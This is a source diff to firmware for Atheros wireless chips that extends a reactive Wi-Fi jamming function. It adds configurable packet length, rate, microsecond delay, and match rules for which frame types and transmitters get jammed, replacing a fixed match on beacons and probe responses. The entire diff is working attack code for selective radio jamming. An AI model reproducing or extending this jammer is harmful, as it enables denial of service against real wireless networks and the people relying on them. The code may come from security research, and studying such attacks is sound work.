@@ -54,6 +54,21 @@ static inline unsigned int update_elapsed(unsigned int prev, unsigned int freq, 
 	return prev + diff * freq * 1000;
 }
 
+/** Update elapsed time in microseconds, and return the time at which this update took place */
+static inline unsigned int update_elapsed_us(unsigned int prev, unsigned int freq, unsigned int *elapsed)
+{
+	unsigned int curr = NOW();
+	unsigned int diff = tickdiff(curr, prev);
+
+	// convert diff to microseconds
+	diff = diff / freq;
+	*elapsed += diff;
+
+	// don't return curr, but compensate for rounding errors in division above
+	return prev + diff * freq;
+	//return curr;
+}
+
 
 /** 
  * Configure the radio for jammin purposes. Recommended to disable interrupts
@@ -107,7 +122,7 @@ int attack_confradio(struct ath_softc_tgt *sc)
  */
 struct ath_tx_buf * attack_build_packet(
 	struct ath_softc_tgt *sc, uint8_t *data,
-	a_int32_t len, char waitack, unsigned char destmac[6])
+	a_int32_t len, char waitack, unsigned char destmac[6], a_int32_t jam_rate_index)
 {
 	struct ieee80211_node_target *ni;
 	struct ath_hal *ah = sc->sc_ah;
@@ -128,7 +143,11 @@ struct ath_tx_buf * attack_build_packet(
 	adf_os_mem_set(series, 0, sizeof(HAL_11N_RATE_SERIES)*4);
 
 	// second argument is of type struct ath_vap_target *
-	rcs[0].rix = ath_get_minrateidx(sc, &sc->sc_vap[0]);
+	if(jam_rate_index < 0) {
+		rcs[0].rix = ath_get_minrateidx(sc, &sc->sc_vap[0]);
+	} else {
+		rcs[0].rix = jam_rate_index;//ath_get_minrateidx(sc, &sc->sc_vap[0]);
+	}
 	rcs[0].tries = ATH_TXMAXTRY;
 	rcs[0].flags = 0;
 
@@ -283,7 +302,7 @@ void attack_free_packet(struct ath_softc_tgt *sc, struct ath_tx_buf *bf)
  * - Make more usage of the functions in ar5416_hw.c
  */
 int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
-		       unsigned int msecs)
+		       unsigned int msecs, unsigned int jam_packet_length, unsigned int jam_delay_us, unsigned int jam_rate_index, unsigned int match_on_position, unsigned char match_packet_type)
 {
 	static const int TXQUEUE = 0;
 	static struct ath_tx_buf *bf;
@@ -307,7 +326,7 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	attack_confradio(sc);
 
 	// Change 3rd parameter to 1 to retransmit the dummy packet.
-	bf = attack_build_packet(sc, NULL, 24, 0, NULL);
+	bf = attack_build_packet(sc, NULL, jam_packet_length, 0, NULL, jam_rate_index);
 	txads = AR5416DESC_20(bf->bf_desc);
 
 	//
@@ -381,11 +400,22 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 		// 1. Jam beacons and probe responses (0x80 and 0x50, respectively)
 		// 2. - If source is a multicast MAC address, then jam *all* transmitters
 		//    - Otherwise jam only the transmitter with MAC address `source`
-		if ( (buff[0] == 0x80 || buff[0] == 0x50)
-		     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
+		//if ( (buff[0] == 0x80 || buff[0] == 0x50)
+		//     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
+		if ( (buff[match_on_position] == match_packet_type)
+				     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
 		{
 			// Abort Rx
 			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;
+
+			//busy waiting to delay the jammed packet
+			{
+				unsigned int elapsed_us = 0;
+				unsigned int prev_us = NOW();
+				while(elapsed_us < jam_delay_us) {
+					prev_us = update_elapsed_us(prev_us, freq, &elapsed_us);
+				}
+			}
 
 			// Jam the packet
 			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(TXQUEUE))) = (a_uint32_t)txads;
